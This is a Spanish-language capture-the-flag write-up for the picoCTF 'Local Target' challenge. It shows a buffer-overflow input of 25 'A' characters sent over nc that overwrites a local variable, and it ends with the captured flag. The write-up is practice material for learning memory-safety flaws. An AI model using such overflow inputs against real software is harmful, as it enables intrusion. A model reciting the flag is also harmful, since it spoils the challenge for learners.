# Local Target

## Objetivo.

Smash the stackCan you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/517/local-target). You can view source [here](https://artifacts.picoctf.net/c/517/local-target.c). And connect with it using:`nc saturn.picoctf.net 52447`

## Solución.

**Analizamos el archivo gdb y luego entramos a nc saturn.picoctf.net 52447**

┌──(kali㉿kali)-[~/picoctf/tercerparcial/localtarget]

└─$ nc saturn.picoctf.net 52447

```
Enter a string: BBBBBBBBBBBBBBBBBBBBBBBB

num is 0
Bye!
```

┌──(kali㉿kali)-[~/picoctf/tercerparcial/localtarget]

└─$ nc saturn.picoctf.net 52447

```
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

**Bandera** {l0c4l5_1n_5c0p3_fee8ef05}

## Notas opcionales.

## Referencias.